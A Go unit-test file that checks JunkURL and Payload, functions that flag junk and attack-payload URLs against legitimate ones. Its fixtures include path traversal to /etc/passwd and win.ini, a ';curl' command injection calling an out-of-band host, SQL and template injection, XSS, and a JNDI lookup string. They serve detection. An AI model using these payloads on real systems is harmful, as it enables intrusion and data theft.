package webextract

import "testing"

func TestJunkURL(t *testing.T) {
	for raw, want := range map[string]bool{
		"http://app/rest/basket/NaN":                          true,
		"http://app/api/user/undefined/orders":                true,
		"http://testphp.vulnweb.com/login.ph%E2%80%A6":        true,
		"http://testphp.vulnweb.com/login.php).":              true,
		"http://testphp.vulnweb.com/cart.php.%5B":             true,
		"http://demo.testfire.net/1234567890*~1*/index.jsp":   true,
		"http://app/search/%3Cscript%3Ealert(1)%3C/script%3E": true,
		"http://app/rest/basket/6":                            false,
		"http://app/index.jsp?content=inside_contact.htm":     false,
		"http://app/products/(category)":                      false,
		"http://app/a/b.php":                                  false,
		"http://app/":                                         false,
	} {
		if got := JunkURL(raw); got != want {
			t.Errorf("%s: %v, want %v", raw, got, want)
		}
	}
}

func TestJunkURLPayloads(t *testing.T) {
	for _, raw := range []string{
		"http://testfire.net/__weave/file/etc/passwd",
		"http://testfire.net/api/v1/license/keys-status/;curl%20d9q3n.oast.live",
		"http://a.test/x?q=%27%20or%201%3D1--",
		"http://a.test/x?name=%7B%7B7*7%7D%7D",
		"http://a.test/redirect?to=javascript:alert(1)",
		"http://a.test/..%2f..%2fwin.ini",
		"http://a.test/x?u=%2524%257Bjndi:ldap://x%257D",
	} {
		if !JunkURL(raw) {
			t.Errorf("JunkURL(%s) = false", raw)
		}
	}
	for _, raw := range []string{
		"http://a.test/rest/products/search?q=apple",
		"http://a.test/index.jsp?content=inside_about.htm",
		"http://a.test/api/v1/license/keys-status",
		"http://a.test/blog/post?postId=3",
	} {
		if JunkURL(raw) {
			t.Errorf("JunkURL(%s) = true", raw)
		}
	}
}

func TestPayloadKeepsLegitimateURLs(t *testing.T) {
	for _, raw := range []string{
		"http://a.test/loader.js?onload=init",
		"http://a.test/page?x=1&curlang=en",
		"http://a.test/login?next=../dashboard",
		"https://requestbin.example.org/api/items",
		"http://a.test/search?q=rock%20or%20pop",
		"http://a.test/docs/sleep-tracking",
	} {
		if Payload(raw) {
			t.Errorf("Payload(%s) = true", raw)
		}
	}
}
